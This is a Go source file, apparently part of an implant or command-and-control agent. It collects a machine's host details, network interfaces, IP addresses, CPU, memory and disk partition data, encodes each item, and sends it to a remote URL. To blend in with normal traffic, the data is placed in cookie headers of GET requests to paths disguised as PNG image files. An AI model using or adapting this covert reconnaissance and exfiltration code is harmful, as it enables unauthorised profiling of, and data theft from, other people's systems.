package utils

import (
	"bytes"
	"fmt"
	guuid "github.com/google/uuid"
	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/host"
	"github.com/shirou/gopsutil/v3/mem"
	net2 "github.com/shirou/gopsutil/v3/net"
	"net"
	"net/http"
)

func GetHostID(debug bool) string {
	return guuid.New().String()
}

func GetHostInfo(debug bool) string {
	PrintDebug(debug, "Getting host info")
	h, _ := host.Info()
	return fmt.Sprintf("%s ", fmt.Sprintf("%s", h))
}

func GetNetInterfaces(debug bool) string {
	PrintDebug(debug, "Getting network interfaces")
	var w bytes.Buffer
	w.WriteString("{\"interfaces\": [")
	info, _ := net2.IOCounters(true)
	for _, interfaces := range info {
		w.WriteString(fmt.Sprintf("%s, ", interfaces))
	}
	w.WriteString("]} ")
	return w.String()
}

func GetHostIps(debug bool) string {
	PrintDebug(debug, "Getting host ips")
	var w bytes.Buffer
	w.WriteString("{\"ips\": [")
	addresses, _ := net.InterfaceAddrs()
	for _, address := range addresses {
		ipaddress, ok := address.(*net.IPNet)
		if !ok || ipaddress.IP.IsLoopback() || !ipaddress.IP.IsGlobalUnicast() {
			continue
		}
		w.WriteString(fmt.Sprintf("\"%s\",", ipaddress.IP.String()))
	}
	w.WriteString("]} ")
	return w.String()
}

func GetCPUInfo(debug bool) string {
	PrintDebug(debug, "Getting CPUs info")
	var w bytes.Buffer
	c, _ := cpu.Info()
	w.WriteString("{\"cpu\": [")
	for _, p := range c {
		w.WriteString(fmt.Sprintf("%s,", p))
	}
	w.WriteString("]} ")
	return w.String()
}

func GetMemoryInfo(debug bool) string {
	PrintDebug(debug, "Getting Memory info")
	m, _ := mem.VirtualMemory()
	return fmt.Sprintf("%s ", m)
}

func GetPartitionsInfo(debug bool) string {
	PrintDebug(debug, "Getting Partitions info")
	var w bytes.Buffer
	w.WriteString("{\"diskPartitions\": [")
	dp, _ := disk.Partitions(true)
	for index := range dp {
		w.WriteString(fmt.Sprintf("%s,", dp[index]))
	}
	w.WriteString("]} ")
	return w.String()
}

func GetPartitionsUsageInfo(debug bool) string {
	PrintDebug(debug, "Getting Partitions usage info")
	var w bytes.Buffer
	w.WriteString("{\"partitionsUsage\": [")
	dp, _ := disk.Partitions(true)
	for index := range dp {
		usage, _ := disk.Usage(dp[index].Mountpoint)
		w.WriteString(fmt.Sprintf("%s,", usage))
	}
	w.WriteString("]} ")
	return w.String()
}

func UploadInfo(debug bool, url string, guid string, data string) error {
	PrintDebug(debug, "Uploading data to %s", url)
	client := &http.Client{}
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("cookie", guid+"="+data)
	_, err := client.Do(req)
	return err
}

func UploadHostInfo(debug bool, url string, guid string) error {
	var data string

	data, _ = EncodeString(debug, GetHostInfo(debug))
	PrintDebug(debug, "Uploading host info")
	UploadInfo(debug, url+"/images/i/ho.png", guid, data)

	data, _ = EncodeString(debug, GetNetInterfaces(debug))
	PrintDebug(debug, "Uploading net interfaces info")
	UploadInfo(debug, url+"/images/i/ni.png", guid, data)

	data, _ = EncodeString(debug, GetHostIps(debug))
	PrintDebug(debug, "Uploading host ips")
	UploadInfo(debug, url+"/images/i/hi.png", guid, data)

	data, _ = EncodeString(debug, GetCPUInfo(debug))
	PrintDebug(debug, "Uploading cpus info")
	UploadInfo(debug, url+"/images/i/cp.png", guid, data)

	data, _ = EncodeString(debug, GetMemoryInfo(debug))
	PrintDebug(debug, "Uploading memory info")
	UploadInfo(debug, url+"/images/i/me.png", guid, data)

	data, _ = EncodeString(debug, GetPartitionsInfo(debug))
	PrintDebug(debug, "Uploading partitions info")
	UploadInfo(debug, url+"/images/i/pa.png", guid, data)

	data, _ = EncodeString(debug, GetPartitionsUsageInfo(debug))
	PrintDebug(debug, "Uploading partitions usage info")
	UploadInfo(debug, url+"/images/i/pu.png", guid, data)

	return nil
}
